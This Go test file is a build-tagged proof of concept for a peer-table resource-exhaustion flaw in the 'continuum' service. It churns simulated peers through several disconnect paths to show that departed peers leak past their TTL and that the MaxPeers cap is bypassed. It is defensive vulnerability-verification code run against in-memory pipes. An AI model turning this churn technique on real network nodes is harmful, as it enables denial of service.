// Copyright (c) 2026 Hemi Labs, Inc.
// Use of this source code is governed by the MIT License,
// which can be found in the LICENSE file.

//go:build peertablepoc

// Runnable proof-of-concept for the peer-table unbounded-growth vulnerability. It is
// build-tagged peertablepoc so it does not run in normal go test / CI: it is an exploit
// demonstration, not a regression assertion. The regression assertions live in
// peer_table_growth_test.go, which is the oracle for every exit and shape.
//
// Run with:
//
//	go test ./service/continuum/ -tags peertablepoc -run TestPeerTablePoC -v
//
//   - Against the unpatched code it passes: churned peers survive past peerTTL and the
//     table peaks above MaxPeers, so sustained churn grows it without bound.
//   - Against a correct fix it fails: departed peers are removed within peerTTL and the
//     count stays within MaxPeers. The failure is the intended signal.
//
// Each cycle rotates the disconnect across the peer-triggered exits (close, busy, a
// failed ping response, a routed cleartext TSS) so a fix that only handles one exit is
// still seen as exploitable. This demonstrates the leak (root cause A) and the count-cap
// bypass (root cause C); the per-entry memory shape (B) and the narrower count-cap shapes
// (no-session binds, stale gossip rows) are pinned by the regression suite, not here.

package continuum

import (
	"context"
	"crypto/ecdh"
	"net"
	"testing"
	"testing/synctest"
	"time"
)

// pocSessionCycle runs one production-faithful connection inside a synctest bubble: a real
// session over net.Pipe, then addPeer + bindPeerKey in handshake order, the real handle
// loop, a pong, then a disconnect through handle()'s real teardown. peak is advanced to the
// high-water table size right after the bind, so a fix that admits then trims back is still
// seen. The disconnect method rotates by n across every exit a peer can trigger.
func pocSessionCycle(t *testing.T, s *Server, srvCtx context.Context, n int, peak *int) Identity {
	t.Helper()
	id := mustSecret(t).Identity

	sp, cp := net.Pipe()
	defer func() { sp.Close(); cp.Close() }() // unwind the pipe even on a t.Fatal
	srv, err := NewTransportFromCurve(ecdh.X25519())
	if err != nil {
		t.Fatal(err)
	}
	cli := new(Transport)
	errCh := make(chan error, 2)
	go func() { errCh <- srv.KeyExchange(srvCtx, sp) }()
	go func() { errCh <- cli.KeyExchange(srvCtx, cp) }()
	for i := 0; i < 2; i++ {
		if err := <-errCh; err != nil {
			t.Fatal(err)
		}
	}
	if err := s.newSession(&id, srv); err != nil {
		t.Fatal(err)
	}
	s.addPeer(srvCtx, PeerRecord{Identity: id, Version: ProtocolVersion, LastSeen: time.Now().Unix()})
	_ = s.bindPeerKey(srvCtx, id, fakeNaClPub(n))
	if c := peerCount(s); c > *peak { // high-water before any trim-after-admit
		*peak = c
	}
	done := make(chan struct{})
	s.wg.Add(1)
	go func() { defer close(done); s.handle(srvCtx, &id, srv, false) }()
	for i := 0; i < 3; i++ {
		if _, _, _, err := cli.read(0); err != nil {
			t.Fatal(err)
		}
	}
	if err := cli.Write(id, PingResponse{}); err != nil {
		t.Fatal(err)
	}
	synctest.Wait()
	switch n % 4 { // rotate the exit so churn is not close-only
	case 0:
		cli.Close() // transport close (read error, continuum.go:1012)
	case 1:
		_ = cli.Write(id, BusyResponse{}) // at-capacity/busy disconnect (dispatch.go)
	case 2:
		_ = cli.Write(id, PingRequest{OriginTimestamp: 1}) // ping-response write fails (dispatch.go:104)
		cli.Close()
	case 3:
		_ = cli.WriteTo(id, s.secret.Identity, defaultTTL, TSSMessage{}) // routed cleartext TSS (continuum.go:1052)
	}
	<-done
	return id
}

// TestPeerTablePoC_UnboundedGrowth churns more than MaxPeers distinct peers, each through a
// full connect/pong/disconnect cycle, then advances the virtual clock past peerTTL. On the
// unpatched code the departed peers are never removed (leak) and the table peaks above
// MaxPeers (bindPeerKey bypasses the cap), so sustained churn grows the peer table.
func TestPeerTablePoC_UnboundedGrowth(t *testing.T) {
	synctest.Test(t, func(t *testing.T) {
		s := peerTableServer(t, 0) // production default MaxPeers
		srvCtx, srvCancel := context.WithCancel(context.Background())
		defer func() { // runs even on a t.Fatal, so a failure is a clean FAIL not a bubble deadlock
			srvCancel()
			time.Sleep(10000 * time.Hour) // drain remaining ttl timers so the bubble can exit
			synctest.Wait()
		}()

		churn := 2*s.cfg.MaxPeers + 88
		peak := 0
		ids := make([]Identity, 0, churn)
		for i := 0; i < churn; i++ {
			ids = append(ids, pocSessionCycle(t, s, srvCtx, i, &peak))
		}

		synctest.Wait()
		time.Sleep(peerTTL + time.Second)
		synctest.Wait()

		survivors := 0
		for _, id := range ids {
			if peerPresent(s, id) {
				survivors++
			}
		}

		t.Logf("MaxPeers=%d churn=%d peak=%d survivors-after-peerTTL=%d", s.cfg.MaxPeers, churn, peak, survivors)
		if survivors == 0 && peak <= s.cfg.MaxPeers {
			t.Fatalf("not exploitable here: the table never exceeded MaxPeers during the churn and no peer "+
				"survived past peerTTL, so the cap bypass and the leak are both closed. peak=%d MaxPeers=%d. "+
				"This PoC fails against a correct fix, the intended signal.", peak, s.cfg.MaxPeers)
		}
		if peak > s.cfg.MaxPeers {
			t.Logf("cap bypass: the table peaked at %d with MaxPeers %d, so churn grows it without bound.", peak, s.cfg.MaxPeers)
		}
		if survivors > 0 {
			t.Logf("leak: %d churned peers are still present a peerTTL after disconnecting, so they are never reaped.", survivors)
		}
	})
}
